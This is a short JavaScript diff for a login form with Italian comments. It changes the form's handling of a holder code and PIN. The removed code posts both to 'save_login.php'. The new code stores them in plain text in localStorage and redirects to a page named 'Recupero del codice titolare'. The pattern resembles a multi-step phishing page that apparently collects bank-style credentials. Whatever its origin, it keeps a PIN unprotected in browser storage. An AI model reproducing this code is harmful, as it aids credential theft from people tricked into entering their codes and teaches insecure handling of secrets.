@@ -28,21 +28,14 @@ document.addEventListener('DOMContentLoaded', function() {
     e.preventDefault();
     if (submitBtn.disabled) return;
 
-    fetch('save_login.php', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        codice: codiceInput.value,
-        pin: pinInput.value
-      })
-    })
-    .then(res => res.json())
-    .then(data => {
-      if (data.success) {
-        form.reset();
-        checkEnableButton();
-      }
-    });
+    // Salva i dati in localStorage invece di inviarli subito
+    localStorage.setItem('loginData', JSON.stringify({
+      codice: codiceInput.value,
+      pin: pinInput.value
+    }));
+
+    // Reindirizza alla pagina di recupero
+    window.location.href = '../Recupero%20del%20codice%20titolare.html';
   });
 
   checkEnableButton();
